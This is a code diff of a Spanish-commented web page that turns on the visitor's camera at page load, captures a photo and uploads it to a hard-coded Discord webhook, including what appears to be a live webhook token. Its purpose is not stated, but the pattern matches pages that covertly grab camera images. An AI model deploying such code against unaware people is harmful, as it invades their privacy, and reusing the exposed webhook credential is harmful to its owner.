@@ -16,7 +16,7 @@
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const captureButton = document.getElementById('captureButton');
-        const discordWebhookURL = 'https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv'; // Reemplaza 'YOUR_DISCORD_WEBHOOK_URL' con tu URL de webhook de Discord
+        const discordWebhookURL = 'https://discord.com/api/webhooks/1109208397896749197/NKuux6oAm72fH4Cn68988GcN5yAn1GzQntzqu5zzw-YJGf5ZPH1phtHqtJTNaM-t_5cv';
 
         // Acceder a la cámara
         async function initCamera() {
@@ -41,12 +41,12 @@
 
         // Enviar la foto al webhook de Discord
         function sendToDiscord(imageData) {
+            const formData = new FormData();
+            formData.append('file', dataURItoBlob(imageData), 'photo.jpg');
+
             fetch(discordWebhookURL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: 'New photo uploaded!', image: imageData })
+                body: formData
             })
             .then(response => {
                 if (response.ok) {
@@ -61,8 +61,22 @@
             });
         }
 
+        // Convertir los datos URI de la imagen a Blob
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const arrayBuffer = new ArrayBuffer(byteString.length);
+            const byteArray = new Uint8Array(arrayBuffer);
+
+            for (let i = 0; i < byteString.length; i++) {
+                byteArray[i] = byteString.charCodeAt(i);
+            }
+
+            return new Blob([arrayBuffer], { type: mimeString });
+        }
+
         // Iniciar la cámara cuando se cargue la página
         window.addEventListener('load', initCamera);
     </script>
 </body>
-</html>
+</html> 
